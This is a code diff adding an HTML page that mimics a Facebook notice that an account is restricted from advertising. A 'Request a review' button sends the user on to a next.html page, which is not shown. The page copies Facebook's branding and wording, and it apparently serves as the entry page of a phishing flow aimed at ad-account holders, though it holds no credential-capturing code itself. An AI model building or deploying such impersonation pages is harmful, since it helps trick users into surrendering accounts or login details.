@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Account Restriction Modal</title>
+  <style>
+    /* Modal styles */
+    .modal {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 1000;
+    }
+
+    .modal-content {
+      background: #fff;
+      border-radius: 8px;
+      padding: 20px;
+      width: 400px;
+      text-align: left;
+      font-family: Arial, sans-serif;
+    }
+
+    .modal-header {
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 15px;
+    }
+
+    .modal-body {
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    .section-header {
+      font-size: 16px;
+      font-weight: bold;
+      margin: 15px 0 10px;
+    }
+
+    ul {
+      margin: 0 0 20px;
+      padding-left: 20px;
+      font-size: 14px;
+    }
+
+    li {
+      margin-bottom: 10px;
+    }
+
+    .modal-footer {
+      display: flex;
+      justify-content: flex-end;
+      gap: 10px;
+    }
+
+    button {
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .cancel-btn {
+      background: #f0f0f0;
+      color: #333;
+    }
+
+    .redirect-btn {
+      background: #007bff;
+      color: #fff;
+    }
+
+    button:hover {
+      opacity: 0.9;
+    }
+  </style>
+</head>
+<body>
+  <div class="modal">
+    <div class="modal-content">
+      <div class="modal-header">
+        Facebook account is restricted from advertising
+      </div>
+      <div class="modal-body">
+        Your account and its assets can’t be used to advertise because it didn’t comply with Advertising Policies. Learn more about this restriction on Account Quality.
+
+        <div class="section-header">What you can do</div>
+        <ul>
+          <li><strong>Request a review:</strong> If you believe this restriction is incorrect, you can request a review of your Facebook account. We will notify you of our decision within 24 hours.</li>
+        </ul>
+      </div>
+      <div class="modal-footer">
+        <button class="cancel-btn" onclick="closeModal()">Cancel</button>
+        <button class="redirect-btn" onclick="redirectToAccountQuality()">Request a review</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Close modal function
+    function closeModal() {
+      document.querySelector('.modal').style.display = 'none';
+    }
+
+    // Redirect function
+    function redirectToAccountQuality() {
+      window.location.href = 'next.html';
+    }
+  </script>
+</body>
+</html>
